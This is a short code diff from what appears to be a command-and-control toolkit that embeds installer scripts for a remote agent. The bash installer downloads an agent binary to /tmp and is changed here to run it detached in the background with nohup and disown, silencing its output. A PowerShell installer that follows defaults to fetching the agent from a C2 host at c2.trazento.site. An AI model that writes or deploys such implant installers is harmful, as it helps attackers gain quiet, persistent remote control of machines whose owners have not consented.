@@ -342,8 +342,10 @@ else
   echo "need curl or wget"; exit 1
 fi
 chmod +x /tmp/c2_agent
-echo "[*] Starting agent..."
-exec /tmp/c2_agent
+echo "[*] Starting agent in background..."
+nohup /tmp/c2_agent >/dev/null 2>&1 &
+disown
+echo "[+] Agent running (PID $!)"
 """
 
 INSTALL_PS1 = r"""$url = if ($env:C2_AGENT_URL) { $env:C2_AGENT_URL } else { "https://c2.trazento.site/agent/windows/x86_64" }
